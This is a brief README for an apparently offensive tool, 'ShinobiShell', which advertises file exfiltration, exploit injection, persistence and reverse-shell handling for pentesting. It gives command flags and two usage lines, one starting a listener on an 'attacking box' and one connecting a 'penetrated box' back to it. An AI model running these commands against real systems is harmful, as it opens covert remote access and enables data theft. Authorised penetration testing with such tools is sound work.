# ShinobiShell
An experimental shell that handles file exfiltration, exploit injection and various other obnoxious tasks.
```
Shinobi shell is a shell specifically designed to make exfiltration, proxying, persistance and other pentesting actions easier.

'-a', '--address', The machine address with a Shinobi Shell listener running'
'-l', '--listen', 'Starts Shinobi Shell listener on port passed in'
'-k', '--key', 'Secret shared key used to create an encrypted tunnel between Shinobi Server and Clients (Required)'
'-r', '--serveraddress', 'Local IP Address used for universal reverse shell handler'
```
Use:

Server (Attacking box) 
`./shinobishell.py -l 4443 -k 1234567890123456`

Client (Penetrated box) 
`./shinobishell.py --address 192.168.1.2:4443 -k 123456790123456` 


